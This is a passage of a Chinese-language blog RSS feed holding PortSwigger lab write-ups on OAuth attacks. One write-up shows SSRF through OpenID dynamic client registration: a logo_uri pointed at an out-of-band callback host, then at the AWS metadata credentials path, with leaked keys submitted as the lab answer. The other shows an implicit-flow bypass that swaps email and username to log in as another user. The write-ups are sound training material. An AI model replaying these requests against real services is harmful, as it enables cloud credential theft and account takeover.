&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logo_uri&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://zy1o9naqos7cl7panwuxbipwdnjg76vv.oastify.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;9TGhjHvJ5yt_dd8perlem&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>再次访问logo页面
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/9TGhjHvJ5yt_dd8perlem/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>z3rtv6ubc6nwvqezt9d66gzjlgigz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>发现对应的ID，确认有SSRF
&lt;img alt="SSRF" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-2.jpg">&lt;/li>
&lt;li>再次访问注册接口发送SSRF目的url
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logo_uri&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;tAOED8w2AuaL-FxSbvIC3&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问logo接口
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/tAOED8w2AuaL-FxSbvIC3/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;LastUpdated&amp;#34; : &amp;#34;2024-12-16T14:38:58.426705184Z&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Type&amp;#34; : &amp;#34;AWS-HMAC&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;AccessKeyId&amp;#34; : &amp;#34;0diucLF19YlhXiJF7A72&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;SecretAccessKey&amp;#34; : &amp;#34;Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Token&amp;#34; : &amp;#34;IFNf1gUdELbDeobXF7HuzY6UO9oIbmqVlZoGVz5FOgBrjTtj3MCdyWv4db8fWuz4im1IpTcNnlMX5XSLUOykAlqratcwiQ92TCTK2WmChL21TTT7c9ZITVr7kjECRDXxTASWCLQKLAqqBKQnj5o3ytsACHy3J0oekv2wQgMxSL3ApTwFyhdniVP1c79efZ3hHn6VZ700htMe6W4LdgJ4Y1JSutbcUxOIDR7k2oEKMiXIJk7ZJDRxTYbEZN5oZf1p&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Expiration&amp;#34; : &amp;#34;2030-12-15T14:38:58.426705184Z&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面点击最上方&lt;code>Submit solution&lt;/code>输入&lt;code>Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Authentication bypass via OAuth implicit flow</title><link>/portswigger-posts/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow/</link><pubDate>Mon, 16 Dec 2024 21:43:57 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>在进行&lt;code>OAuth&lt;/code>认证过程中出现Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /authenticate &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@hotdog.com&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;wiener&amp;#34;,&amp;#34;token&amp;#34;:&amp;#34;rx9Etd148p5AaqjXJTQ9rQOy9ke9ci-Dp5Wav6iy_pc&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=gYCR46I3JvHznVUjfpXa2OV1QOTDmPKn; Secure; HttpOnly; SameSite=None&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>、&lt;code>username&lt;/code>参数，后发送请求即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /authenticate &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;carlos@carlos-montoya.net&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;token&amp;#34;:&amp;#34;rx9Etd148p5AaqjXJTQ9rQOy9ke9ci-Dp5Wav6iy_pc&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=4NcHGKeMLuw7h4e94CiQLIfgcUyUIU1l; Secure; HttpOnly; SameSite=None&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item></channel></rss>